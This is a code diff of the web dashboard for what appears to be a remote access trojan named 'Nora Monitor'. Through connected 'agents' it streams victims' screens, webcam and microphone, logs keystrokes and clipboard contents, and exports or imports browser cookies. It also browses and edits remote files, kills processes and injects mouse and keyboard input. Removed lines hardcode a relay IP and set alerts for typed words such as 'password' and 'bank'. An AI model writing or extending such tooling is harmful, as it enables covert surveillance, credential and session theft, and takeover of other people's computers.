+  border-radius: 10px; padding: 10px 28px; font-size: .9rem; cursor: pointer; font-weight: 700;
+}
+#rec-btn.stop { background: var(--red); }
+
+/* ── Clipboard ──────────────────────────────────────────── */
+#clip-list { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; padding: 16px 20px; }
+.clip-item {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px 14px;
+  font-size: .82rem; word-break: break-all;
+}
+.clip-ts { color: var(--muted); font-size: .7rem; margin-top: 4px; }
+
+/* ── Toast ──────────────────────────────────────────────── */
+#toast-wrap { position: fixed; bottom: 20px; right: 20px; display: flex; flex-direction: column-reverse; gap: 8px; z-index: 9999; }
+.toast {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px 16px;
+  font-size: .8rem; color: var(--text);
+  box-shadow: var(--shadow); max-width: 320px;
+  animation: slideIn .2s ease;
+}
+@keyframes slideIn { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:none} }
+.toast.success { border-color: var(--green); }
+.toast.error   { border-color: var(--red); }
+
+/* ── Scrollbars ─────────────────────────────────────────── */
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 999px; }
+
+/* ── Responsive ─────────────────────────────────────────── */
+@media (max-width: 700px) {
+  :root { --sidebar-w: 52px; }
+  .nav-btn span:not(.icon) { display: none; }
+  .nav-label { display: none; }
+  #topbar .logo span { display: none; }
 }
 </style>
 </head>
 <body>
 
+<!-- TOP BAR -->
 <div id="topbar">
-  <h1>NORA</h1>
-  <span id="status" class="disconnected">Disconnected</span>
-  <select id="agent-select" onchange="selectAgent(this.value)">
-    <option value="">— no agents —</option>
-  </select>
-  <span id="fps-info">-- fps</span>
-  <span id="rec-timer"></span>
-  <button id="cam-btn" class="topbar-btn" onclick="toggleCamera()">📷 <span class="btn-label">Camera</span></button>
-  <button id="mic-btn" class="topbar-btn" onclick="toggleMic()">🎙 <span class="btn-label">Mic</span></button>
-  <button id="rec-btn" class="topbar-btn" onclick="toggleRecord()">⏺ <span class="btn-label">REC</span></button>
+  <div class="logo">Nora<span>Monitor</span></div>
+  <div id="status-pill">
+    <div id="status-dot"></div>
+    <span id="status-text">Connecting…</span>
+  </div>
+  <select id="agent-select"><option value="">— select agent —</option></select>
+  <div id="fps-badge">— fps</div>
 </div>
 
-<div id="main">
-  <div id="view-area">
-    <div id="screen-panel">
-      <canvas id="screen"></canvas>
-      <div id="cursor"></div>
-    </div>
-    <div id="camera-panel">
-      <span id="cam-placeholder">Camera off</span>
-      <img id="camera-feed" alt="camera" style="display:none;" draggable="false">
-    </div>
-  </div>
+<!-- SHELL -->
+<div id="shell">
 
-  <div id="sidebar">
-    <div id="sidebar-handle" onclick="toggleSidebar()">
-      <span>Logs &amp; Controls</span>
-      <svg viewBox="0 0 24 24"><path d="M7 14l5-5 5 5z"/></svg>
+  <!-- SIDEBAR -->
+  <nav id="sidebar">
+    <div class="nav-section">
+      <div class="nav-label">Monitor</div>
+      <button class="nav-btn active" data-panel="screen-panel"><span class="icon">🖥</span><span>Screen</span></button>
+      <button class="nav-btn" data-panel="cam-panel"><span class="icon">📷</span><span>Camera</span></button>
+      <button class="nav-btn" data-panel="mic-panel"><span class="icon">🎙</span><span>Microphone</span></button>
+      <button class="nav-btn" data-panel="clip-panel"><span class="icon">📋</span><span>Clipboard</span></button>
     </div>
-    <div class="tab-bar">
-      <div class="tab active" onclick="switchTab('keylog')">Keylog</div>
-      <div class="tab" onclick="switchTab('clipboard')">Clipboard</div>
-      <div class="tab" onclick="switchTab('processes')">Procs</div>
-      <div class="tab" onclick="switchTab('files')">Files</div>
-      <div class="tab" onclick="switchTab('cookies')">🍪</div>
+    <div class="nav-section">
+      <div class="nav-label">Data</div>
+      <button class="nav-btn" data-panel="kl-panel"><span class="icon">⌨</span><span>Keylogs</span></button>
+      <button class="nav-btn" data-panel="cookie-panel"><span class="icon">🍪</span><span>Cookies</span></button>
+      <button class="nav-btn" data-panel="fm-panel"><span class="icon">📁</span><span>Files</span></button>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">System</div>
+      <button class="nav-btn" data-panel="proc-panel"><span class="icon">⚙</span><span>Processes</span></button>
+      <button class="nav-btn" data-panel="rec-panel"><span class="icon">⏺</span><span>Recording</span></button>
+    </div>
+  </nav>
+
+  <!-- MAIN -->
+  <div id="main">
+
+    <!-- SCREEN -->
+    <div class="panel active" id="screen-panel">
+      <div id="screen-wrap">
+        <img id="screen-img" src="" alt="Waiting for stream…" draggable="false">
+        <div id="screen-overlay">
+          <button class="screen-btn" id="fs-btn">⛶ Fullscreen</button>
+        </div>
+      </div>
+      <div id="desktop-ctrl">
+        <span style="color:var(--muted);font-size:.75rem;align-self:center">Desktop:</span>
+        <button class="ctrl-btn" data-dcmd="new">+ New</button>
+        <button class="ctrl-btn" data-dcmd="left">← Left</button>
+        <button class="ctrl-btn" data-dcmd="right">Right →</button>
+        <button class="ctrl-btn" data-dcmd="close">✕ Close</button>
+      </div>
+      <div id="remote-kb">
+        <input id="kb-input" type="text" placeholder="Type here to send keys to the remote PC…">
+        <button id="kb-send">Send</button>
+      </div>
     </div>
 
-    <!-- Keylog -->
-    <div id="tab-keylog" class="tab-panel active">
+    <!-- CAMERA -->
+    <div class="panel" id="cam-panel">
       <div class="panel-header">
-        Keystroke Log
-        <div style="display:flex;gap:5px;">
-          <button class="hdr-btn" onclick="saveLog()">Save</button>
-          <button class="hdr-btn" onclick="clearLog()">Clear</button>
-        </div>
+        <h2>Camera</h2>
+        <button class="toggle-btn" id="cam-toggle">▶ Start</button>
       </div>
-      <div id="keylog"></div>
-      <div id="alert-section">
-        <label>Keyword Alerts</label>
-        <div id="alert-input-row">
-          <input id="alert-input" placeholder="e.g. password, bank…" onkeydown="if(event.key==='Enter')addAlert()">
-          <button id="alert-add-btn" onclick="addAlert()">Add</button>
-        </div>
-        <div id="alert-tags"></div>
+      <div id="cam-wrap"><img id="cam-img" src="" alt="Camera off"></div>
+    </div>
+
+    <!-- MICROPHONE -->
+    <div class="panel" id="mic-panel">
+      <div class="panel-header"><h2>Microphone</h2></div>
+      <div class="panel-body">
+        <div id="mic-vis">🎙</div>
+        <div id="mic-label">Microphone is off</div>
+        <button class="toggle-btn" id="mic-toggle">▶ Start</button>
       </div>
     </div>
 
-    <!-- Clipboard -->
-    <div id="tab-clipboard" class="tab-panel">
-      <div class="panel-header">Clipboard History <button class="hdr-btn" onclick="clearClipboard()">Clear</button></div>
-      <div id="clipboard-list"><span style="color:var(--dim);padding:10px;font-size:11px;">Nothing copied yet…</span></div>
+    <!-- CLIPBOARD -->
+    <div class="panel" id="clip-panel">
+      <div class="panel-header"><h2>Clipboard</h2><span class="ph-meta" id="clip-count">0 entries</span></div>
+      <div id="clip-list"></div>
     </div>
 
-    <!-- Processes -->
-    <div id="tab-processes" class="tab-panel">
-      <div id="proc-controls">
-        <input id="proc-search" placeholder="Search…" oninput="filterProcs()">
-        <button id="proc-refresh" onclick="loadProcs()">↻ Refresh</button>
+    <!-- KEYLOGS -->
+    <div class="panel" id="kl-panel">
+      <div class="panel-header"><h2>Keylogs</h2><span class="ph-meta" id="kl-count">0 keys</span></div>
+      <div id="kl-toolbar">
+        <button id="kl-clear" class="danger">🗑 Clear view</button>
+        <a id="kl-export-link" href="#" target="_blank">⬇ Export HTML Report</a>
       </div>
-      <div class="proc-header"><span>Name</span><span style="text-align:right">CPU%</span><span style="text-align:right">MB</span><span></span></div>
+      <div id="kl-feed"></div>
+    </div>
+
+    <!-- COOKIES -->
+    <div class="panel" id="cookie-panel">
+      <div class="panel-header"><h2>Cookies</h2></div>
+      <div class="panel-body">
+        <button class="big-btn" id="btn-export-cookies">
+          <span class="bicon">📤</span>
+          <div class="binfo"><strong>Export Cookies</strong><span>Pull all browser cookies from the agent</span></div>
+        </button>
+        <button class="big-btn" id="btn-import-cookies">
+          <span class="bicon">📥</span>
+          <div class="binfo"><strong>Import Cookies</strong><span>Push a previously exported cookie set</span></div>
+        </button>
+        <div id="cookie-status">Ready.</div>
+      </div>
+    </div>
+
+    <!-- FILES -->
+    <div class="panel" id="fm-panel">
+      <div class="panel-header"><h2>File Manager</h2></div>
+      <div id="fm-path-bar">
+        <input id="fm-path" type="text" placeholder="Remote path…">
+        <button id="fm-go">Go</button>
+      </div>
+      <div id="fm-list"></div>
+      <div id="fm-editor">
+        <div id="fm-editor-path"></div>
+        <textarea id="fm-textarea"></textarea>
+        <button id="fm-save">Save File</button>
+      </div>
+    </div>
+
+    <!-- PROCESSES -->
+    <div class="panel" id="proc-panel">
+      <div class="panel-header"><h2>Processes</h2><span class="ph-meta" id="proc-count">—</span></div>
+      <div id="proc-toolbar">
+        <input id="proc-search" type="text" placeholder="Filter by name or PID…">
+        <button id="proc-refresh">↺ Refresh</button>
+      </div>
       <div id="proc-list"></div>
     </div>
 
-    <!-- Files -->
-    <div id="tab-files" class="tab-panel">
-      <div id="fm-path-bar">
-        <div id="fm-breadcrumb">/</div>
-        <button id="fm-up-btn" onclick="fmUp()">↑ Up</button>
-        <label id="fm-upload-btn">⬆ Upload<input type="file" id="fm-upload-input" style="display:none" multiple onchange="fmUpload(this)"></label>
-      </div>
-      <div id="fm-list"><div id="fm-status">Select an agent and open Files</div></div>
-    </div>
-
-    <!-- Cookies -->
-    <div id="tab-cookies" class="tab-panel" style="overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;">
-      <p class="ck-note">Export cookies from Chrome, Edge, Firefox on the agent PC. Close those browsers first.</p>
-      <button class="ck-btn" id="ck-export-btn" onclick="cookieExport()">⬇ Export Cookies from Agent</button>
-      <div id="ck-export-status" class="ck-status"></div>
-      <hr class="ck-divider">
-      <p class="ck-note">Import a cookies_export.json back to the agent.</p>
-      <label class="ck-btn" style="text-align:center;cursor:pointer;">
-        ⬆ Import Cookies to Agent
-        <input type="file" id="ck-import-file" accept=".json" style="display:none" onchange="cookieImport(this)">
-      </label>
-      <div id="ck-import-status" class="ck-status"></div>
-    </div>
-
-    <!-- Control panel (always visible below tabs) -->
-    <div id="control-panel">
-      <label><input type="checkbox" id="ctrl-toggle" checked> Remote control active</label>
-      <div class="hotkey-hint">Ctrl+Shift+D — toggle</div>
-      <button id="kbd-toggle-btn" onclick="toggleKbd()">⌨ Remote Keyboard</button>
-      <div id="desktop-controls">
-        <span style="font-size:10px;color:var(--dim);">Desktop:</span>
-        <button class="desk-btn" onclick="desktopCmd('new')">⊞ New</button>
-        <button class="desk-btn" onclick="desktopCmd('left')">◀</button>
-        <button class="desk-btn" onclick="desktopCmd('right')">▶</button>
-        <button class="desk-btn" onclick="desktopCmd('close')" style="color:var(--red);border-color:#7f1d1d;">✕</button>
-      </div>
-      <div id="win-picker">
-        <button id="win-picker-btn" onclick="openWinPicker()">🎯 Pick Target Window</button>
-        <div id="win-target-label"><span style="color:var(--dim)">Target: </span><span id="win-target-title">—</span></div>
-        <div id="win-stream-badge">👁 Streaming · <button id="win-stream-stop" onclick="stopWinStream()">Stop</button></div>
+    <!-- RECORDING -->
+    <div class="panel" id="rec-panel">
+      <div class="panel-header"><h2>Screen Recording</h2></div>
+      <div class="panel-body">
+        <div id="rec-indicator">⏺</div>
+        <div id="rec-label">Not recording</div>
+        <button id="rec-btn">Start Recording</button>
       </div>
     </div>
-  </div>
-</div>
 
-<!-- Window picker modal -->
-<div id="win-modal" onclick="if(event.target===this)closeWinPicker()">
-  <div id="win-modal-box">
-    <div id="win-modal-title">
-      <span>🎯 Pick Target Window</span>
-      <button id="win-modal-close" onclick="closeWinPicker()">✕</button>
-    </div>
-    <div id="win-list"></div>
-    <button id="win-clear-btn" onclick="clearWinTarget()">✕ Clear target</button>
-  </div>
-</div>
+  </div><!-- /main -->
+</div><!-- /shell -->
 
-<!-- Remote keyboard -->
-<div id="kbd-window">
-  <div id="kbd-titlebar" onmousedown="kbdDragStart(event)">
-    <span>⌨</span>
-    <span id="kbd-title">REMOTE KEYBOARD</span>
-    <button id="kbd-close" onclick="toggleKbd()">✕</button>
-  </div>
-  <div id="kbd-indicator">
-    <div id="kbd-dot"></div>
-    <span id="kbd-last">Type below — keys go to remote PC</span>
-  </div>
-  <textarea id="kbd-box" placeholder="Click here and start typing…" spellcheck="false" autocorrect="off" autocomplete="off"></textarea>
-  <div id="kbd-hint">Keys sent live · textarea clears automatically</div>
-</div>
+<div id="toast-wrap"></div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/socket.io-client@4.7.5/dist/socket.io.min.js"></script>
 <script>
-const RELAY = "http://16.55.3.205:5000";
-
-const canvas      = document.getElementById("screen");
-const ctx         = canvas.getContext("2d");
-const keylogEl    = document.getElementById("keylog");
-const statusEl    = document.getElementById("status");
-const fpsEl       = document.getElementById("fps-info");
-const cursorEl    = document.getElementById("cursor");
-const ctrlToggle  = document.getElementById("ctrl-toggle");
-const screenPanel = document.getElementById("screen-panel");
-const recBtn      = document.getElementById("rec-btn");
-const recTimer    = document.getElementById("rec-timer");
-const camBtn      = document.getElementById("cam-btn");
-const camPanel    = document.getElementById("camera-panel");
-const camFeed     = document.getElementById("camera-feed");
-const camPlaceholder = document.getElementById("cam-placeholder");
-const agentSelect = document.getElementById("agent-select");
-const micBtn      = document.getElementById("mic-btn");
-
-let selectedAgent = "";
-let frameCount = 0, lastFpsTime = Date.now();
-let cameraActive = false;
-let micActive = false;
-let allProcs = [];
-let alertKeywords = [];
-let keylogText = "";
-
-const socket = io(RELAY, { transports: ["websocket", "polling"] });
-
-// ── Audio ─────────────────────────────────────────────────────────────────────
-let audioCtx = null, audioNextTime = 0;
-const SAMPLE_RATE = 16000;
-
-function getAudioCtx() {
-  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: SAMPLE_RATE });
-  if (audioCtx.state === "suspended") audioCtx.resume();
-  return audioCtx;
+/* ── Utilities ──────────────────────────────────────────── */
+function toast(msg, type) {
+  const el = document.createElement("div");
+  el.className = "toast" + (type ? " " + type : "");
+  el.textContent = msg;
+  document.getElementById("toast-wrap").prepend(el);
+  setTimeout(() => el.remove(), 4000);
+}
+function fmtBytes(b) {
+  if (b < 1024) return b + " B";
+  if (b < 1048576) return (b/1024).toFixed(1) + " KB";
+  return (b/1048576).toFixed(1) + " MB";
+}
+function esc(s) {
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
 }
 
-socket.on("audio", d => {
-  if (d._agent !== selectedAgent || !micActive) return;
-  try {
-    const ctx = getAudioCtx();
-    const binary = atob(d.data);
-    const bytes = new Uint8Array(binary.length);
-    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-    const samples = new Int16Array(bytes.buffer);
-    const f32 = new Float32Array(samples.length);
-    for (let i = 0; i < samples.length; i++) f32[i] = samples[i] / 32768;
-    const buf = ctx.createBuffer(1, f32.length, SAMPLE_RATE);
-    buf.copyToChannel(f32, 0);
-    const src = ctx.createBufferSource();
-    src.buffer = buf;
-    src.connect(ctx.destination);
-    const now = ctx.currentTime;
-    if (audioNextTime < now + 0.05) audioNextTime = now + 0.05;
-    src.start(audioNextTime);
-    audioNextTime += buf.duration;
-  } catch(e) {}
+/* ── Navigation ─────────────────────────────────────────── */
+document.querySelectorAll(".nav-btn").forEach(btn => {
+  btn.addEventListener("click", () => {
+    document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
+    document.querySelectorAll(".panel").forEach(p => p.classList.remove("active"));
+    btn.classList.add("active");
+    document.getElementById(btn.dataset.panel).classList.add("active");
+    if (btn.dataset.panel === "proc-panel" && currentAgent) reqProcesses();
+  });
 });
 
-function toggleMic() {
-  if (!selectedAgent) return;
-  if (micActive) {
-    socket.emit("mic_off", { _target: selectedAgent });
-    micActive = false;
-    micBtn.innerHTML = "🎙 <span class='btn-label'>Mic</span>";
-    micBtn.className = "topbar-btn";
-    audioNextTime = 0;
-  } else {
-    socket.emit("mic_on", { _target: selectedAgent });
-    micActive = true;
-    micBtn.innerHTML = "🎙 <span class='btn-label'>Mic ON</span>";
-    micBtn.className = "topbar-btn active";
-    getAudioCtx();
-  }
-}
+/* ── Socket.IO ──────────────────────────────────────────── */
+const socket = io({ transports: ["websocket", "polling"] });
+let currentAgent = "";
+let _exportedCookies = null;
 
-// ── Connection ────────────────────────────────────────────────────────────────
+const statusDot  = document.getElementById("status-dot");
+const statusText = document.getElementById("status-text");
+const agentSel   = document.getElementById("agent-select");
+const fpsBadge   = document.getElementById("fps-badge");
+
 socket.on("connect", () => {
-  statusEl.textContent = "Connected";
-  statusEl.className = "connected";
-  socket.emit("hub_join", {});
+  statusDot.classList.add("live");
+  statusText.textContent = "Connected";
+  socket.emit("hub_join");
 });
 socket.on("disconnect", () => {
-  statusEl.textContent = "Disconnected";
-  statusEl.className = "disconnected";
+  statusDot.classList.remove("live");
+  statusText.textContent = "Disconnected";
 });
 
-// ── Agent list ────────────────────────────────────────────────────────────────
 socket.on("agent_list", agents => {
-  const prev = selectedAgent;
-  agentSelect.innerHTML = agents.length
-    ? agents.map(a => `<option value="${escAttr(a.name)}">${escHtml(a.name)}</option>`).join("")
-    : '<option value="">— no agents —</option>';
+  const prev = agentSel.value;
+  agentSel.innerHTML = '<option value="">— select agent —</option>';
+  agents.forEach(a => {
+    const opt = document.createElement("option");
+    opt.value = opt.textContent = a.name;
+    agentSel.appendChild(opt);
+  });
   if (prev && agents.find(a => a.name === prev)) {
-    agentSelect.value = prev;
-  } else if (agents.length) {
-    selectedAgent = agents[0].name;
-    agentSelect.value = selectedAgent;
-  } else {
-    selectedAgent = "";
+    agentSel.value = prev;
+  } else if (agents.length === 1) {
+    agentSel.value = agents[0].name;
+    currentAgent = agents[0].name;
+    updateExportLink();
   }
 });
 
-function selectAgent(name) {
-  if (winStreaming) stopWinStream();
-  selectedAgent = name;
-  clearLog();
-  clearClipboard();
-}
-
-// ── Tabs ──────────────────────────────────────────────────────────────────────
-function switchTab(name) {
-  const names = ["keylog", "clipboard", "processes", "files", "cookies"];
-  document.querySelectorAll(".tab").forEach((t, i) => {
-    t.className = "tab" + (names[i] === name ? " active" : "");
-  });
-  document.querySelectorAll(".tab-panel").forEach(p => p.className = "tab-panel");
-  document.getElementById("tab-" + name).className = "tab-panel active";
-  if (name === "processes") loadProcs();
-  if (name === "files") fmLoadDir(fmCurPath || null);
-}
-
-// ── Screen ────────────────────────────────────────────────────────────────────
-const frameImg = new Image();
-frameImg.onload = () => {
-  canvas.width = frameImg.naturalWidth;
-  canvas.height = frameImg.naturalHeight;
-  ctx.drawImage(frameImg, 0, 0);
-};
-socket.on("frame", d => {
-  if (d._agent !== selectedAgent) return;
-  frameImg.src = "data:image/jpeg;base64," + d.data;
-  frameCount++;
-  const now = Date.now();
-  if (now - lastFpsTime >= 1000) { fpsEl.textContent = frameCount + " fps"; frameCount = 0; lastFpsTime = now; }
+agentSel.addEventListener("change", () => {
+  currentAgent = agentSel.value;
+  updateExportLink();
 });
 
-// ── Keylog ────────────────────────────────────────────────────────────────────
-let _klLastApp = null, _klCurLine = null, _klCurChars = null;
+/* ── FPS ─────────────────────────────────────────────────── */
+let _fpsN = 0, _fpsSec = Date.now();
+function tickFps() {
+  _fpsN++;
+  const now = Date.now();
+  if (now - _fpsSec >= 1000) {
+    fpsBadge.textContent = _fpsN + " fps";
+    _fpsN = 0; _fpsSec = now;
+  }
+}
+
+/* ── Screen ──────────────────────────────────────────────── */
+const screenImg = document.getElementById("screen-img");
+socket.on("frame", d => {
+  if (d._agent !== currentAgent) return;
+  tickFps();
+  screenImg.src = "data:image/jpeg;base64," + d.data;
+});
+
+screenImg.addEventListener("click", e => {
+  if (!currentAgent) return;
+  const r = screenImg.getBoundingClientRect();
+  socket.emit("command", { action:"mouse_click", x:(e.clientX-r.left)/r.width, y:(e.clientY-r.top)/r.height, _target:currentAgent });
+});
+screenImg.addEventListener("contextmenu", e => {
+  e.preventDefault();
+  if (!currentAgent) return;
+  const r = screenImg.getBoundingClientRect();
+  socket.emit("command", { action:"mouse_right", x:(e.clientX-r.left)/r.width, y:(e.clientY-r.top)/r.height, _target:currentAgent });
+});
+screenImg.addEventListener("wheel", e => {
+  e.preventDefault();
+  if (!currentAgent) return;
+  socket.emit("command", { action:"scroll", dy:e.deltaY>0?3:-3, _target:currentAgent });
+}, { passive:false });
+
+document.getElementById("fs-btn").addEventListener("click", () => {
+  const w = document.getElementById("screen-wrap");
+  document.fullscreenElement ? document.exitFullscreen() : w.requestFullscreen?.();
+});
+
+document.querySelectorAll("[data-dcmd]").forEach(btn => {
+  btn.addEventListener("click", () => {
+    if (!currentAgent) return;
+    socket.emit("desktop_cmd", { cmd:btn.dataset.dcmd, _target:currentAgent });
+  });
+});
+
+const kbInput = document.getElementById("kb-input");
+document.getElementById("kb-send").addEventListener("click", () => {
+  const text = kbInput.value;
+  if (!text || !currentAgent) return;
+  socket.emit("command", { action:"type", text, _target:currentAgent });
+  kbInput.value = "";
+});
+kbInput.addEventListener("keydown", e => { if (e.key === "Enter") document.getElementById("kb-send").click(); });
+
+/* ── Keylogs ─────────────────────────────────────────────── */
+let klKeyCount = 0, klCurrentApp = "", klCurrentLine = null, klCurrentBlock = null;
+const klFeed = document.getElementById("kl-feed");
+const klCount = document.getElementById("kl-count");
 
 socket.on("key", d => {
-  if (d._agent !== selectedAgent) return;
-  const char = d.char || "";
-  const time  = d.time  || new Date().toLocaleTimeString("en-GB",{hour12:false});
-  const app   = d.app   || "Unknown";
+  if (d._agent && d._agent !== currentAgent) return;
+  klKeyCount++;
+  klCount.textContent = klKeyCount + " keys";
+  const app = d.app || "Unknown";
+  const ch  = d.char || "";
+  const ts  = d.time || "";
 
-  keylogText += char === "↵" ? "\n" : char;
-
-  if (app !== _klLastApp) {
-    _klLastApp = app;
-    _klCurLine = null; _klCurChars = null;
-    const hdr = document.createElement("div");
-    hdr.className = "kl-app-header";
-    hdr.innerHTML = `<span style="font-size:11px">🖥</span><span class="kl-app-name">${escHtml(app)}</span><span class="kl-app-time">${escHtml(time)}</span>`;
-    keylogEl.appendChild(hdr);
+  if (app !== klCurrentApp) {
+    klCurrentApp = app;
+    klCurrentLine = null;
+    const parts = app.split(" — ");
+    const block = document.createElement("div");
+    block.className = "kl-app-block";
+    block.innerHTML = `<div class="kl-app-hdr"><span>${esc(parts[0])}</span>${parts[1]?`<span style="color:var(--muted);font-weight:400"> — ${esc(parts[1])}</span>`:""}<span class="app-time">${esc(ts)}</span></div>`;
+    klCurrentBlock = block;
+    klFeed.appendChild(block);
   }
 
-  if (char === "↵" || char === "[ENTER]") {
-    _klCurLine = null; _klCurChars = null;
-    const br = document.createElement("div");
-    br.className = "kl-line";
-    br.innerHTML = `<span class="kl-ts">${escHtml(time)}</span><span class="kl-chars"><span class="key-special">↵</span></span>`;
-    keylogEl.appendChild(br);
-    checkAlerts(keylogText);
-    keylogEl.scrollTop = keylogEl.scrollHeight;
-    return;
+  if (!klCurrentLine) {
+    klCurrentLine = document.createElement("div");
+    klCurrentLine.className = "kl-line";
+    klCurrentLine.innerHTML = `<span class="kl-ts">${esc(ts)}</span>`;
+    klCurrentBlock.appendChild(klCurrentLine);
   }
 
-  if (!_klCurLine) {
-    _klCurLine = document.createElement("div");
-    _klCurLine.className = "kl-line";
-    const ts = document.createElement("span");
-    ts.className = "kl-ts";
-    ts.textContent = time;
-    _klCurChars = document.createElement("span");
-    _klCurChars.className = "kl-chars";
-    _klCurLine.appendChild(ts);
-    _klCurLine.appendChild(_klCurChars);
-    keylogEl.appendChild(_klCurLine);
-  }
+  let span;
+  if (ch === "⌫") span = `<span class="kl-bs">⌫</span>`;
+  else if (ch === "↵") { klCurrentLine = null; return; }
+  else if (["⇥","⎋","⌦","⇞","⇟","↑","↓","←","→"].includes(ch)) span = `<span class="kl-sp">${esc(ch)}</span>`;
+  else span = esc(ch);
 
-  const span = document.createElement("span");
-  if (char === "⌫") { span.className = "key-backspace"; span.textContent = char; }
-  else if (char.startsWith("[") && char.endsWith("]")) { span.className = "key-special"; span.textContent = char; }
-  else if (char.length > 1) { span.className = "key-special"; span.textContent = char; }
-  else span.textContent = char;
-  _klCurChars.appendChild(span);
-
-  keylogEl.scrollTop = keylogEl.scrollHeight;
-  checkAlerts(keylogText);
+  klCurrentLine.innerHTML += span;
+  if (klFeed.scrollTop + klFeed.clientHeight > klFeed.scrollHeight - 80)
+    klFeed.scrollTop = klFeed.scrollHeight;
 });
 
-function clearLog() {
-  keylogEl.innerHTML = "";
-  keylogText = "";
-  _klLastApp = null; _klCurLine = null; _klCurChars = null;
-}
-function saveLog() {
-  const blob = new Blob([keylogText], { type: "text/plain" });
-  const a = document.createElement("a");
-  a.href = URL.createObjectURL(blob);
-  a.download = "keylog_" + new Date().toISOString().slice(0,19).replace(/[:.]/g,"-") + ".txt";
-  a.click();
-  URL.revokeObjectURL(a.href);
-}
+document.getElementById("kl-clear").addEventListener("click", () => {
+  klFeed.innerHTML = "";
+  klKeyCount = 0; klCurrentApp = ""; klCurrentLine = null; klCurrentBlock = null;
+  klCount.textContent = "0 keys";
+});
 
-// ── Keyword Alerts ────────────────────────────────────────────────────────────
-function addAlert() {
-  const val = document.getElementById("alert-input").value.trim().toLowerCase();
-  if (!val || alertKeywords.includes(val)) return;
-  alertKeywords.push(val);
-  document.getElementById("alert-input").value = "";
-  renderAlertTags();
-  Notification.requestPermission();
+function updateExportLink() {
+  const link = document.getElementById("kl-export-link");
+  if (currentAgent) {
+    link.href = "/keylogs/" + encodeURIComponent(currentAgent);
+    link.style.opacity = "1"; link.style.pointerEvents = "";
+  } else {
+    link.href = "#"; link.style.opacity = ".4"; link.style.pointerEvents = "none";
+  }
 }
-function renderAlertTags() {
-  document.getElementById("alert-tags").innerHTML = alertKeywords.map(k =>
-    `<span class="alert-tag" onclick="removeAlert('${escAttr(k)}')" title="Click to remove">${escHtml(k)} ✕</span>`
-  ).join("");
+updateExportLink();
+
+/* ── Camera ──────────────────────────────────────────────── */
+const camImg = document.getElementById("cam-img");
+let camOn = false;
+socket.on("camera_frame", d => {
+  if (d._agent !== currentAgent) return;
+  camImg.src = "data:image/jpeg;base64," + d.data;
+});
+document.getElementById("cam-toggle").addEventListener("click", function() {
+  if (!currentAgent) return;
+  camOn = !camOn;
+  socket.emit(camOn ? "camera_on" : "camera_off", { _target:currentAgent });
+  this.textContent = camOn ? "⏹ Stop" : "▶ Start";
+  this.classList.toggle("on", camOn);
+});
+
+/* ── Microphone ──────────────────────────────────────────── */
+let micOn = false;
+document.getElementById("mic-toggle").addEventListener("click", function() {
+  if (!currentAgent) return;
+  micOn = !micOn;
+  socket.emit(micOn ? "mic_on" : "mic_off", { _target:currentAgent });
+  this.textContent = micOn ? "⏹ Stop" : "▶ Start";
+  this.classList.toggle("on", micOn);
+  document.getElementById("mic-vis").classList.toggle("active", micOn);
+  document.getElementById("mic-label").textContent = micOn ? "Microphone is live…" : "Microphone is off";
+});
+
+/* ── Clipboard ───────────────────────────────────────────── */
+let clipCount = 0;
+socket.on("clipboard", d => {
+  if (d._agent !== currentAgent) return;
+  clipCount++;
+  document.getElementById("clip-count").textContent = clipCount + " entries";
+  const el = document.createElement("div");
+  el.className = "clip-item";
+  el.innerHTML = `<div>${esc(d.text)}</div><div class="clip-ts">${new Date().toLocaleTimeString()}</div>`;
+  document.getElementById("clip-list").prepend(el);
+});
+
+/* ── Processes ───────────────────────────────────────────── */
+let _allProcs = [];
+const procSearch = document.getElementById("proc-search");
+const procList   = document.getElementById("proc-list");
+
+function reqProcesses() {
+  if (!currentAgent) return;
+  socket.emit("get_processes", { _target:currentAgent });
 }
-function removeAlert(kw) { alertKeywords = alertKeywords.filter(k => k !== kw); renderAlertTags(); }
-let _lastAlertAt = {};
-function checkAlerts(text) {
-  const lower = text.toLowerCase();
-  alertKeywords.forEach(kw => {
-    if (lower.includes(kw)) {
-      const now = Date.now();
-      if (!_lastAlertAt[kw] || now - _lastAlertAt[kw] > 10000) {
-        _lastAlertAt[kw] = now;
-        if (Notification.permission === "granted")
-          new Notification("Nora — Keyword Detected", { body: `"${kw}" was typed` });
-      }
-    }
+document.getElementById("proc-refresh").addEventListener("click", reqProcesses);
+procSearch.addEventListener("input", renderProcs);
+
+socket.on("processes_result", d => {
+  _allProcs = d.processes || [];
+  document.getElementById("proc-count").textContent = _allProcs.length + " processes";
+  renderProcs();
+});
+
+function renderProcs() {
+  const q = procSearch.value.toLowerCase();
+  const list = q ? _allProcs.filter(p => (p.name||"").toLowerCase().includes(q)||String(p.pid).includes(q)) : _allProcs;
+  procList.innerHTML = "";
+  list.forEach(p => {
+    const row = document.createElement("div");
+    row.className = "proc-row";
+    row.innerHTML = `<div class="proc-name">${esc(p.name||"?")}</div><div class="proc-pid">${p.pid}</div><div class="proc-cpu">${(p.cpu||0).toFixed(1)}%</div><div class="proc-mem">${fmtBytes((p.mem||0)*1024)}</div><button class="proc-kill" data-pid="${p.pid}">Kill</button>`;
+    procList.appendChild(row);
+  });
+  procList.querySelectorAll(".proc-kill").forEach(btn => {
+    btn.addEventListener("click", () => {
+      socket.emit("kill_process", { pid:parseInt(btn.dataset.pid), _target:currentAgent });
+      setTimeout(reqProcesses, 800);
+    });
   });
 }
 
-// ── Clipboard ─────────────────────────────────────────────────────────────────
-const clipList = document.getElementById("clipboard-list");
-let clipItems = [];
-socket.on("clipboard", d => {
-  if (d._agent !== selectedAgent) return;
-  clipItems.unshift({ text: d.text, time: new Date().toLocaleTimeString() });
